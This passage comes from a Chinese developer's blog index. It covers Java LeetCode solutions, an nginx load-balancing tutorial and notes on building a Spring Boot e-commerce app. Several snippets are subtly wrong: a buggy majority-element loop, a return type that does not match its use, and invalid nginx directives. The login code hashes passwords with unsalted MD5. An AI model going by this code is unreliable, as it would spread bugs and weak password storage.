你可以假设数组是非空的，并且给定的数组总是存在多数元素。 示例 1: 输入: [3,2,3] 输出: 3 示例 2: 输入: [2,2,1,1,1,2,2] 输出: 2 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/majority-element 思路一：使用hash表，遍历数组并计数即可 思路二：排序，题中说了总是存在多数元素，那么排序后的弟⌊ n/2 ⌋即为所求答案 思路三：从第一个数开始count=1，遇到相同的就加1，遇到不同的就减1，减到0就重新换个数开始计数，总能找到最多的那个 // 思路一 public int majorityElement(int[] nums) &#123; HashMap&lt;Integer, Integer&gt; count = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; count.put(nums[i], count.getOrDefault(nums[i], 0) + 1); &#125; Set&lt;Map.Entry&lt;Integer, Integer&gt;&gt; entries = count.entrySet(); for (Map.Entry&lt;Integer, Integer&gt; entry : entries) &#123; if(entry.getValue() &gt; nums.length / 2)&#123; return entry.getKey(); &#125; &#125; return -1; &#125; // 思路二 public int majorityElement(int[] nums) &#123; Arrays.sort(nums); return nums[nums.length / 2]; &#125; // 思路三 public int majorityElement(int[] nums) &#123; int res = nums[0]; int count = 1; for (int i = 1; i &lt; nums.length; i++) &#123; if(nums[i] == res)&#123; count ++; &#125;else &#123; count --; if(count == 0)&#123; res = nums[i + 1]; &#125; &#125; &#125; return res; &#125; 二分查找（力扣704题） 给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。 示例 1: 输入: nums = [-1,0,3,5,9,12], target = 9 输出: 4 解释: 9 出现在 nums 中并且下标为 4 示例 2: 输入: nums = [-1,0,3,5,9,12], target = 2 输出: -1 解释: 2 不存在 nums 中因此返回 -1 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/binary-search- 无需多言 public int search(int[] nums, int target) &#123; if(nums == null || nums.length == 0)&#123; return -1; &#125; int left = 0; int right = nums.length - 1; int mid = left + (right - left) / 2; while (left &lt;= right)&#123; if(target &gt; nums[mid])&#123; left = mid + 1; &#125;else if(target &lt; nums[mid])&#123; right = mid -1; &#125;else &#123; return mid; &#125; mid = left + (right - left) / 2; &#125; return -1; &#125; 数组中第k个最大元素（力扣215题） 在未排序的数组中找到第 k 个最大的元素。请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。 示例 1: 输入: [3,2,1,5,6,4] 和 k = 2 输出: 5 示例 2: 输入: [3,2,3,1,2,4,5,5,6] 和 k = 4 输出: 4 说明:可以假设 k 总是有效的，且 1 ≤ k ≤ 数组的长度 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/kth-largest-element-in-an-array 思路一：优先队列，维护一个容量为k的优先队列（最小堆），其队首元素为最小值，当遍历完整个数组后，队首元素即为第k大的数 思路二：基于快速排序的快速选择算法 // 优先队列 public int findKthLargest(int[] nums, int k) &#123; // 第 1 大的数，下标是 len - 1; // 第 2 大的数，下标是 len - 2; // ... // 第 k 大的数，下标是 len - k; // 创建优先队列 // 创建一个容量为k的小根堆，那么遍历整个数组的过程中维护这个小根堆，那么其根元素就是数组中第k大的数 PriorityQueue&lt;Integer&gt; priorityQueue = new PriorityQueue&lt;&gt;(k, Comparator.comparingInt(a -&gt; a)); for (int i = 0; i &lt; k; i++) &#123; priorityQueue.offer(nums[i]); &#125; for (int i = k; i &lt; nums.length; i++) &#123; Integer peek = priori tyQueue.peek(); if(nums[i] &gt; peek)&#123; priorityQueue.poll(); priorityQueue.offer(nums[i]); &#125; &#125; return priorityQueue.peek(); &#125; // 快速选择 public int findKthLargest(int[] nums, int k) &#123; // 第 1 大的数，下标是 len - 1; // 第 2 大的数，下标是 len - 2; // ... // 第 k 大的数，下标是 len - k; int len = nums.length; int target = len - k; int left = 0; int right = len - 1; while (true) &#123; int pivotIndex = partition(nums, left, right); if (pivotIndex == target) &#123; return nums[pivotIndex]; &#125; else if (pivotIndex &lt; target) &#123; left = pivotIndex + 1; &#125; else &#123; // pivotIndex &gt; target right = pivotIndex - 1; &#125; &#125; &#125; private int partition(int[] nums, int left, int right) &#123; int randomIndex = left + random.nextInt(right - left + 1); swap(nums, left, randomIndex); // all in nums[left + 1..le) &lt;= pivot; // all in nums(ge..right] &gt;= pivot; int pivot = nums[left]; int le = left + 1; int ge = right; while (true) &#123; while (le &lt;= ge &amp;&amp; nums[le] &lt; pivot) &#123; le++; &#125; while (le &lt;= ge &amp;&amp; nums[ge] &gt; pivot) &#123; ge--; &#125; if (le &gt;= ge) &#123; break; &#125; swap(nums, le, ge); le++; ge--; &#125; swap(nums, left, ge); return ge; &#125; private void swap(int[] nums, int index1, int index2) &#123; int temp = nums[index1]; nums[index1] = nums[index2]; nums[index2] = temp; &#125; 搜索二维矩阵（力扣240题） 编写一个高效的算法来搜索 m x n 矩阵 matrix 中的一个目标值 target。该矩阵具有以下特性： 每行的元素从左到右升序排列。 每列的元素从上到下升序排列。 示例: 现有矩阵 matrix 如下： *[* [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30] ] 给定 target = 5，返回 true。 给定 target = 20，返回 false。 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/search-a-2d-matrix-ii 思路一：题中说的很清楚是有序的矩阵，可以模仿二分搜索解决该题 思路二： // 思路一 public boolean searchMatrix(int[][] matrix, int target) &#123; for (int[] nums : matrix) &#123; if(search(nums, target))&#123; return true; &#125; &#125; return false; &#125; public boolean search(int[] nums, int target) &#123; if(nums == null || nums.length == 0)&#123; return false; &#125; int left = 0; int right = nums.length - 1; int mid = left + (right - left) / 2; while (left &lt;= right)&#123; if(target &gt; nums[mid])&#123; left = mid + 1; &#125;else if(target &lt; nums[mid])&#123; right = mid -1; &#125;else &#123; return true; &#125; mid = left + (right - left) / 2; &#125; return false; &#125; // 思路二 public boolean searchMatrix(int[][] matrix, int target) &#123; // 从矩阵的右上角搜索 (0, matrix[0].length) int m = matrix[0].length; int n = matrix.length; int x = 0; int y = m - 1; while (x &lt; n &amp;&amp; y &gt;= 0)&#123; if(target == matrix[x][y])&#123; return true; &#125; else if (target &lt; matrix[x][y]) &#123; y --; &#125;else &#123; x ++; &#125; &#125; return false; &#125;","tags":[{"name":"java,algorithm","slug":"java-algorithm","permalink":"https://sunzhengyu99.github.io/tags/java-algorithm/"}]},{"title":"nginx","date":"2022-07-24T08:30:05.000Z","path":"2022/07/24/nginx/","text":"Nginx负载均衡配置 将java项目打包并启动这里为了有效果，打包了两份，当访问接口时，控制台打印不同的日志 java -jar .\\api-2.0.1-8081.jar --server.port=8081 java -jar .\\api-2.0.1-8082.jar --server.port=8082 配置nginx#user nobody; worker_processes 4; #pid logs/nginx.pid; events &#123; worker_connections 40960; &#125; http &#123; include mime.types; default_type application/octet-stream; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; upstream myservice &#123; server 127.0.0.1:8081; server 127.0.0.1:8083; # server 127.0.0.1:8847; &#125; server &#123; listen 80; server_name localhost; location / &#123; proxy_pass http://myservice; &#125; &#125; #include vhosts.conf; map $time_iso8601 $logdate &#123; &#x27;~^(?&lt;ymd&gt;\\\\d&#123;4&#125;-\\\\d&#123;2&#125;-\\\\d&#123;2&#125;)&#x27; $ymd; default &#x27;date-not-found&#x27;; &#125; include vhosts/*.conf; client_max_body_size 50m; client_body_buffer_size 60k; client_body_timeout 60; client_header_buffer_size 64k; client_header_timeout 60; error_page 400 /error/400.html; error_page 403 /error/403.html; error_page 404 /error/404.html; error_page 500 /error/500.html; error_page 501 /error/501.html; error_page 502 /error/502.html; error_page 503 /error/503.html; error_page 504 /error/504.html; error_page 505 /error/505.html; error_page 506 /error/506.html; error_page 507 /error/507.html; error_page 509 /error/509.html; error_page 510 /error/510.html; keepalive_requests 100; large_client_header_buffers 4 64k; reset_timedout_connection on; send_timeout 60; sendfile_max_chunk 512k; server_names_hash_bucket_size 256; &#125; worker_rlimit_nofile 100000; 主要配置内容为 upstream myservice &#123; server 127.0.0.1:8081; server 127.0.0.1:8083; # server 127.0.0.1:8847; &#125; server &#123; listen 80; server_name localhost; location / &#123; proxy_pass http://myservice; &#125; &#125; 启动nginx即可 **当启动ngin没反应时，多半是配置文件有问题，可以直接拷贝正确的配置后修改 Nginx负载均衡策略 前端/用户所有对Tomcat(应用服务器)的请求都是通过Nginx转发的:用户请求发送到nginx，nginx转发的对应的服务器，一个集群中有多个服务器节点，那么Nginx怎么确定转发到哪个服务器节点呢?Nginx提供了四种负载均衡策略，同时也支持配置第三方的负载均衡策略。 轮询 根据用户的请求交替的发送到每个服务器节点，是nginx默认的负载均衡策略 upstream myservice &#123; server 127.0.0.1:8081 max_fails=3 fail_timeout 20s fail_time=100s; # 如果在20s内失败了三次 则让该服务器停止100s server 127.0.0.1:8082; server 127.0.0.1:8083; server 127.0.0.1:8084 backup; # 备用机 server 127.0.0.1:8085 down; # 该服务器永远都用不上 &#125; max_fails设置在fail_timeout参数设置的时间内最大失败次数，如果在这个时间内，所有针对该服务器的请求都失败了，那么认为该服务器会被认为是停机了 fail_timeout 与max_fails结合使用 fail_time服务器会被认为停机的时间长度,默认为10s backup标记该服务器为备用服务器,当主服务器停止时，请求会被发送到它这里 down标记服务器永久停机了 权重 upstream myservice &#123; server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125; 权重方式，在轮询策略的基础上指定轮询的几率(根据服务器性能和资源情况设置对应权重比) weight参数用于指定轮询几率,weight的默认值为1，weight的数值与访问比率成正比 权重越高分配到需要处理的请求越多 此策略比较适合服务器的硬件配置差别比较大的情况 ip_hash指定负载均衡器按照基于客户端IP的分配方式，这个方法确保了相同的客户端的请求一直发送到相同的服务器，以保证session会话。这样每个访客都固定访问一个后端服务器，可以解决session不能跨服务器的问题。 upstream myservice &#123; ip_hash; # 保证每个用户固定访问同一个后端服务器 server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125; least _conn把请求转发给连接数较少的后端服务器。轮询算法是把请求平均的转发给各个后端，使它们的负载大致相同;但是，有些请求占用的时间很长，会导致其所在的后端负载较高。这种情况下，least _conn这种方式就可以达到更好的负载均衡效果。 upstream myservice &#123; least _conn; # 把请求转发到连接数较少的fu server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125;","tags":[{"name":"nginx","slug":"nginx","permalink":"https://sunzhengyu99.github.io/tags/nginx/"}]},{"title":"fmmall","date":"2022-07-18T09:42:34.000Z","path":"2022/07/18/fmmall/","text":"商城项目 项目地址：https://github.com/sunzhengyu99/fmmall/tree/master 体验地址：http://www.fmmall.top/ 1.业务逻辑开发1.1登录注册1.1.1 完成dao操作 创建实体类 package com.sunzy.fmmall.entity; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import java.sql.Date; @Data @AllArgsConstructor @NoArgsConstructor public class Users &#123; private Integer userId; private String username; private String password; private String nickname; private String realname; private String userImg; private String userMobile; private String userEmail; private String userSex; private Date userBirth; private Date userRegtime; private Date userModtime; &#125; 编写UserDao文件 package com.sunzy.fmmall.dao; import com.sunzy.fmmall.entity.User; import com.sunzy.fmmall.entity.Users; import org.apache.ibatis.annotations.Mapper; @Mapper public interface UserDao &#123; public User queryUserByName(String name); public User insertUser(Users user); &#125; 编写UserMapper.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt; &lt;mapper namespace=&quot;com.sunzy.fmmall.dao.UserDao&quot;&gt; &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.sunzy.fmmall.entity.Users&quot;&gt; &lt;!-- WARNING - @mbg.generated --&gt; &lt;id column=&quot;user_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;username&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;username&quot; /&gt; &lt;result column=&quot;password&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;password&quot; /&gt; &lt;result column=&quot;nickname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;nickname&quot; /&gt; &lt;result column=&quot;realname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;realname&quot; /&gt; &lt;result column=&quot;user_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userImg&quot; /&gt; &lt;result column=&quot;user_mobile&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userMobile&quot; /&gt; &lt;result column=&quot;user_email&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userEmail&quot; /&gt; &lt;result column=&quot;user_sex&quot; jdbcType=&quot;CHAR&quot; property=&quot;userSex&quot; /&gt; &lt;result column=&quot;user_birth&quot; jdbcType=&quot;DATE&quot; property=&quot;userBirth&quot; /&gt; &lt;result column=&quot;user_regtime&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;userRegtime&quot; /&gt; &lt;result column=&quot;user_modtime&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;userModtime&quot; /&gt; &lt;/resultMap&gt; &lt;insert id=&quot;insertUser&quot;&gt; insert into users(username, password, user_img, user_regtime, user_modtime) values(#&#123;username&#125;, #&#123;password&#125;,#&#123;userImg&#125;, #&#123;userRegtime&#125;,#&#123;userModtime&#125;) &lt;/insert&gt; &lt;select id=&quot;queryUserByName&quot; resultMap=&quot;BaseResultMap&quot;&gt; select user_id, username, password, nickname, realname, user_img, user_mobile, user_email, user_sex, user_birth, user_regtime, user_modtime from users where username = #&#123;name&#125; &lt;/select&gt; &lt;/mapper&gt; 1.1.2 完成service功能 创建接口com.sunzy.fmmall.service.UserService package com.sunzy.fmmall.service; import com.sunzy.fmmall.vo.ResultVO; public interface UserService &#123; public ResultVO login(String username, String password); public ResultVO regist(String username, String password); &#125; 创建实现类 com.sunzy.fmmall.service.Impl.UserServiceImpl package com.sunzy.fmmall.service.Impl; import com.sunzy.fmmall.dao.UserDao; import com.sunzy.fmmall.entity.Users; import com.sunzy.fmmall.service.UserService; import com.sunzy.fmmall.utils.MD5Utils; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import org.springframework.stereotype.Service; import org.springframework.transaction.annotation.Transactional; import javax.annotation.Resource; import java.util.Date; @Service public class UserServiceImpl implements UserService &#123; @Resource private UserDao userDao; @Override public ResultVO login(String username, String password) &#123; Users user = userDao.queryUserByName(username); if(user == null)&#123; return new ResultVO(ResStatus.NO, &quot;用户不存在！&quot;, null); &#125; String realPasswd = user.getPassword(); if(realPasswd.equals(MD5Utils.md5(password)))&#123; return new ResultVO(ResStatus.OK, &quot;登录成功！&quot;, user); &#125;else &#123; return new ResultVO(ResStatus.NO, &quot;密码错误！&quot;, null); &#125; &#125; @Transactional @Override public ResultVO regist(String username, String password) &#123; synchronized (this)&#123; // 判断用户是否已经注册 Users user = userDao.queryUserByName(username); if(user == null)&#123; // 将新用户信息添加到数据库中 String md5 = MD5Utils.md5(password); user = new Users(); user.setPassword(md5); user.setUsername(username); user.setUserImg(&quot;img/default.png&quot;); user.setUserRegtime(new Date()); user.setUserModtime(new Date()); int i = userDao.insertUser(user); if(i &gt; 0)&#123; return new ResultVO(ResStatus.OK, &quot;用户注册成功！&quot;, user); &#125;else &#123; return new ResultVO(ResStatus.NO, &quot;用户注册失败！&quot;, null); &#125; &#125;else&#123; return new ResultVO(ResStatus.NO, &quot;用户已被注册！&quot;, null); &#125; &#125; &#125; &#125; 1.1.3 完成controller代码 package com.sunzy.fmmall.controller; import com.sunzy.fmmall.entity.Users; import com.sunzy.fmmall.service.UserService; import com.sunzy.fmmall.vo.ResultVO; import io.swagger.annotations.Api; import io.swagger.annotations.ApiImplicitParam; import io.swagger.annotations.ApiImplicitParams; import io.swagger.annotations.ApiOperation; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; //@RequestBody @RestController @RequestMapping(&quot;/user&quot;) @Api(value = &quot;用户管理&quot;, tags = &quot;提供用户注册和登录接口&quot;) public class UserController &#123; @Autowired private UserService userService; @ApiOperation(&quot;用户登录接口&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户账号&quot;, required = true), @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户密码&quot;, required = true) &#125;) @GetMapping(&quot;/login&quot;) public ResultVO login(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password)&#123; return userService.login(username, password); &#125; @ApiOperation(&quot;用户注册接口&quot;) // @ApiImplicitParams(&#123; // @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户注册账号&quot;, required = true), // @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户注册密码&quot;, required = true) // &#125;) @PostMapping(&quot;/regist&quot;) public ResultVO regist(@RequestBody Users user)&#123; String username = user.getUsername(); String password = user.getPassword(); return userService.regist(username, password); &#125; &#125; 1.1.4 接口测试 1.2 解决前后端跨域问题1.1 前端 通过jsonp跨域 通常为了减轻web服务器的负载，我们把js、css，img等静态资源分离到另一台独立域名的服务器上，在html页面中再通过相应的标签从不同域名下加载静态资源，而被浏览器允许，基于此原理，我们可以通过动态创建script，再请求一个带参网址实现跨域通信。 &lt;script&gt; var script = document.createElement(&#x27;script&#x27;); script.type = &#x27;text/javascript&#x27;; // 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数 script.src = &#x27;http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback&#x27;; document.head.appendChild(script); // 回调执行函数 function handleCallback(res) &#123; alert(JSON.stringify(res)); &#125; &lt;/script&gt; 1.2 后端 只需要在controller中添加@CrossOrigin注解即可允许后端响应数据进行跨域响应。 1.3 将用户信息显示在前端在前端登录（login.html的doSubmit方法中）的ajax请求的响应代码中加入以下内容 if(vo.code == 10000)&#123; //如果登录成功，就把token存储到cookie setCookieValue(&quot;token&quot;,vo.msg); //将用户昵称和用户头像的路径保存在cookie setCookieValue(&quot;userId&quot;,vo.data.userId); setCookieValue(&quot;username&quot;,vo.data.username); setCookieValue(&quot;userImg&quot;,vo.data.userImg) &#125; 即登录成功后，将用户的token和用户信息一同保存到cookie中，用于前端传值 在index.html的created函数中添加以下代码 var token = getCookieValue(&quot;token&quot;); if(token !=null &amp;&amp; token !=&quot;&quot;)&#123; this.isLogin = true; this.username = getCookieValue(&quot;username&quot;); this.userimg = getCookieValue(&quot;userImg&quot;); &#125; 获取到用户的基本信息，再通过v-model显示到前端页面中。 1.4 首页轮播图 数据库操作实现 编写sql语句 SELECT * FROM index_img WHERE &#96;status&#96; &#x3D; 1 ORDER BY seq 在IndexImgMapper定义方法 public interface IndexImgMapper extends GeneralDao&lt;IndexImg&gt; &#123; public List&lt;IndexImg&gt; listIndexImgs(); &#125; 配置映射文件 &lt;select id=&quot;listIndexImgs&quot; resultType=&quot;com.sunzy.fmmall.entity.IndexImg&quot; resultMap=&quot;BaseResultMap&quot;&gt; SELECT * FROM index_img WHERE `status` = 1 ORDER BY seq &lt;/select&gt; 业务逻辑实现 IndexImgServiceImpl添加以下内容 @Service public class IndexImgServiceImpl implements IndexImgService &#123; @Resource private IndexImgMapper indexImgMapper; @Override public ResultVO listIndeximgs() &#123; List&lt;IndexImg&gt; indexImgs = indexImgMapper.listIndexImgs(); if(indexImgs.size() == 0)&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125; return new ResultVO(ResStatus.OK, &quot;success&quot;,indexImgs); &#125; &#125; 接口实现 IndexImgController @RestController @RequestMapping(&quot;/index&quot;) @CrossOrigin public class IndexImgsController &#123; @Autowired private IndexImgService indexImgService; @GetMapping(&quot;/indeximg&quot;) public ResultVO addGoods()&#123; return ResultVO.success(indexImgService.listIndeximgs()); &#125; &#125; 1.5 分类列表接口开发 数据库分析 添加实体类CategoryVO 与category的区别在于多了一个属性用于存放子标题 List&lt;CategoryVO&gt; categoryVOList; dao实现 方法一 使用递归sql查询数据库 dao代码 public List&lt;CategoryVO&gt; getCategoryList2(int parentId); mapper映射文件 &lt;resultMap id=&quot;ResultMap&quot; type=&quot;com.sunzy.fmmall.entity.CategoryVO&quot;&gt; &lt;!-- WARNING - @mbg.generated --&gt; &lt;id column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;category_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryName&quot; /&gt; &lt;result column=&quot;category_level&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryLevel&quot; /&gt; &lt;result column=&quot;parent_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;parentId&quot; /&gt; &lt;result column=&quot;category_icon&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryIcon&quot; /&gt; &lt;result column=&quot;category_slogan&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categorySlogan&quot; /&gt; &lt;result column=&quot;category_pic&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryPic&quot; /&gt; &lt;result column=&quot;category_bg_color&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryBgColor&quot; /&gt; &lt;collection property=&quot;categoryVOList&quot; column=&quot;category_id&quot; select=&quot;com.sunzy.fmmall.dao.CategoryMapper.getCategoryList2&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;getCategoryList2&quot; resultType=&quot;com.sunzy.fmmall.entity.CategoryVO&quot; resultMap=&quot;ResultMap&quot;&gt; select * from category where parent_id = #&#123;parentId&#125; &lt;/select&gt; 方法二 直接获取所有分类的数据后，在java代码中进行级别分类的处理，可以大大提高处理效率 service代码实现 方法一 @Override public List&lt;CategoryVO&gt; getCategoryList() &#123; return categoryMapper.getCategoryList2(0); &#125; 方法二 @Override public List&lt;CategoryVO&gt; getCategoryList() &#123; List&lt;Category&gt; categories = categoryMapper.getCategoryList(); List&lt;CategoryVO&gt; categoryVOS = new ArrayList&lt;&gt;(); // 获取所有的一级标题 for (Category category : categories) &#123; CategoryVO categoryVO = new CategoryVO(); if(category.getCategoryLevel() == 1)&#123; BeanUtils.copyProperties(category, categoryVO); categoryVOS.add(categoryVO); &#125; &#125; // 将一级标题下的二级标题添加到setCategoryVOList属性中 for (CategoryVO categoryVO : categoryVOS) &#123; List&lt;CategoryVO&gt; category2List = new ArrayList&lt;&gt;(); for (Category category : categories) &#123; // 筛选条件为 二级标题且父标题与一级标题一致 if(category.getCategoryLevel() == 2 &amp;&amp; category.getParentId().equals(categoryVO.getCategoryId()))&#123; CategoryVO categoryvo = new CategoryVO(); BeanUtils.copyProperties(category, categoryvo); category2List.add(categoryvo); &#125; &#125; categoryVO.setCategoryVOList(category2List); // System.out.println(categoryVO); &#125; for (CategoryVO categoryVO : categoryVOS) &#123; for(CategoryVO categoryVO2: categoryVO.getCategoryVOList())&#123; //遍历所有二级标题 List&lt;CategoryVO&gt; category3List = new ArrayList&lt;&gt;(); //保存三级标题的数组 for (Category category : categories) &#123; // 筛选符合条件的三级标题 存放到二级标题的 categoryVOList中 if(category.getCategoryLevel() == 3 &amp;&amp; category.getParentId().equals(categoryVO2.getCategoryId()))&#123; CategoryVO categoryvo = new CategoryVO(); BeanUtils.copyProperties(category, categoryvo); category3List.add(categoryvo); &#125; &#125; categoryVO2.setCategoryVOList(category3List); &#125; System.out.println(categoryVO); &#125; return categoryVOS; &#125; controller实现 @Autowired private CategoryService categoryService; @GetMapping(&quot;/category-list&quot;) @ApiOperation(value = &quot;获取首页分类数据&quot;) public ResultVO getCategoryList()&#123; return ResultVO.success(categoryService.getCategoryList1()); // return ResultVO.success(categoryService.getCategoryList2()); &#125; 实测方法二比方法一的响应速度要快很多倍，所以还是减少在数据库中进行数据的处理。 方法一 方法二 实现效果如下 1.6 商品推荐 推荐商品原则可以是 1.根据商城销量推荐2.推荐商城最新上架的商品 说明：商品推荐算法是根据多个维度进行权重计算的结果，计算出一个匹配值 数据库操作 select * from product order by create_time desc limit 0,3; 添加实体类ProdoctVO 与product的区别在于多一个属性用于存在与该产品相关的图片 private List&lt;ProductImg&gt; imgs; public List&lt;ProductImg&gt; getImgs() &#123; return imgs; &#125; public void setImgs(List&lt;ProductImg&gt; imgs) &#123; this.imgs = imgs; &#125; dao实现 ProductDao @Mapper public interface ProductMapper extends GeneralDao&lt;Product&gt; &#123; public List&lt;Product&gt; getRecommendProduct(); &#125; xml &lt;id column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;root_category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;rootCategoryId&quot; /&gt; &lt;result column=&quot;sold_num&quot; jdbcType=&quot;INTEGER&quot; property=&quot;soldNum&quot; /&gt; &lt;result column=&quot;product_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;productStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;content&quot; jdbcType=&quot;LONGVARCHAR&quot; property=&quot;content&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;getRecommendProduct&quot; resultType=&quot;com.sunzy.fmmall.entity.Product&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product order by create_time desc limit 0,3; &lt;/select&gt; ProductImgDao @Mapper public interface ProductImgMapper extends GeneralDao&lt;ProductImg&gt; &#123; public List&lt;ProductImg&gt; getProductImgsById(int productId); &#125; xml &lt;id column=&quot;id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;id&quot; /&gt; &lt;result column=&quot;item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;itemId&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;url&quot; /&gt; &lt;result column=&quot;sort&quot; jdbcType=&quot;INTEGER&quot; property=&quot;sort&quot; /&gt; &lt;result column=&quot;is_main&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isMain&quot; /&gt; &lt;result column=&quot;created_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createdTime&quot; /&gt; &lt;result column=&quot;updated_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updatedTime&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;getProductImgsById&quot; resultType=&quot;com.sunzy.fmmall.entity.ProductImg&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product_img where item_id = #&#123;productId&#125; &lt;/select&gt; service代码 @Resource private ProductMapper productMapper; @Resource private ProductImgMapper productImgMapper; @Override public List&lt;ProductVO&gt; getRecommendProductList() &#123; List&lt;Product&gt; recommendProductList = productMapper.getRecommendProduct(); List&lt;ProductVO&gt; productVOS = new ArrayList&lt;&gt;(); for (Product product : recommendProductList) &#123; ProductVO productVO = new ProductVO(); List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId())); BeanUtils.copyProperties(product, productVO); productVO.setImgs(imgs); productVOS.add(productVO); &#125; return productVOS; &#125; controller代码 @Autowired private ProductService productService; @GetMapping(&quot;/list-recommends&quot;) @ApiOperation(value = &quot;获取商品推荐数据&quot;) public ResultVO getRecommendsList()&#123; return ResultVO.success(productService.getRecommendProductList()); &#125; 测试结果 1.7 分类商品推荐 一次性加载所有分类的推荐商品，整体完成初始化 分别获取所有一级标题下销量最高的六个商品 返回查询到的6个商品 sql语句 from product where root_category_id &#x3D; rootId and product_status &#x3D; 1 order by sold_num desc limit 0,6; 获取到rootId下销量前六的商品信息 dao public List&lt;Product&gt; getRecommendByCategory(int rootId); xml &lt;select id=&quot;getRecommendByCategory&quot; resultType=&quot;com.sunzy.fmmall.entity.Product&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product where root_category_id = #&#123;rootId&#125; and product_status = 1 order by sold_num desc limit 0,6; &lt;/select&gt; service @Override public List&lt;CategoryDTO&gt; getRecommendByCategory() &#123; List&lt;Category&gt; categoryList = categoryMapper.getCategoryList(); // 获取所有的分类 List&lt;CategoryDTO&gt; categoryDTOList = new ArrayList&lt;&gt;(); // 用于保存结果 for (Category category : categoryList) &#123; if (category.getCategoryLevel() == 1) &#123; CategoryDTO categoryDTO = new CategoryDTO(); List&lt;ProductVO&gt; productVOList = new ArrayList&lt;&gt;(); List&lt;Product&gt; productList = productMapper.getRecommendByCategory(category.getCategoryId()); // 根据root_category_id筛选属于该一级分类的商品 for (Product product : productList) &#123; // 将产品的图片查询出来加入到productVO的imgs属性中 ProductVO productVO = new ProductVO(); List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId())); BeanUtils.copyProperties(product, productVO); productVO.setImgs(imgs); productVOList.add(productVO); &#125; // 将处理得到的productVOList加入到CategoryDTO的products属性中 categoryDTO.setProducts(productVOList); BeanUtils.copyProperties(category, categoryDTO); categoryDTOList.add(categoryDTO); &#125; &#125; return categoryDTOList; &#125; ** 该方法实现的有点复杂，并且效率比较低，可以采用联合查询的方法进行优化 controller 